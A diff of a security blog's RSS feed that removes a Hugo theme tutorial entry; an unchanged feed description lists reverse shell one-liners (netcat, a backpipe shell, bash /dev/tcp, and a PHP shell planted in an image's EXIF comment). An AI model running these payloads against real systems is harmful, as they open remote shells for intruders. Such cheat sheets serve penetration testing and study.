@@ -36,15 +36,5 @@ By default, we have the SSHD logs in /var/log/auth.</description>
 Netcat nc 172.16.1.1 4545 -e /bin/sh mknod /tmp/backpipe p /bin/sh 0&amp;lt;/tmp/backpipe | nc 172.16.1.1 4444 1&amp;gt;/tmp/backpipe Bash bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;IP&amp;gt;/&amp;lt;PORT&amp;gt; 0&amp;gt;&amp;amp;1 Exif of a file with php exiftool -Comment=&amp;#39;&amp;lt;?php $sock = fsockopen(&amp;#34;&amp;lt;IPADDRESS&amp;gt;&amp;#34;,&amp;lt;PORT&amp;gt;);$proc = proc_open(&amp;#34;/bin/sh -i&amp;#34;, array(0=&amp;gt;$sock, 1=&amp;gt;$sock, 2=&amp;gt;$sock), $pipes); ?</description>
     </item>
     
-    <item>
-      <title>Creating a New Theme</title>
-      <link>https://fl1xh.github.io/posts/creating-a-new-theme/</link>
-      <pubDate>Sun, 28 Sep 2014 00:00:00 +0000</pubDate>
-      
-      <guid>https://fl1xh.github.io/posts/creating-a-new-theme/</guid>
-      <description>Introduction This tutorial will show you how to create a simple theme in Hugo. I assume that you are familiar with HTML, the bash command line, and that you are comfortable using Markdown to format content. I&amp;rsquo;ll explain how Hugo uses templates and how you can organize your templates to create a theme. I won&amp;rsquo;t cover using CSS to style your theme.
-We&amp;rsquo;ll start with creating a new site with a very basic template.</description>
-    </item>
-    
   </channel>
 </rss>
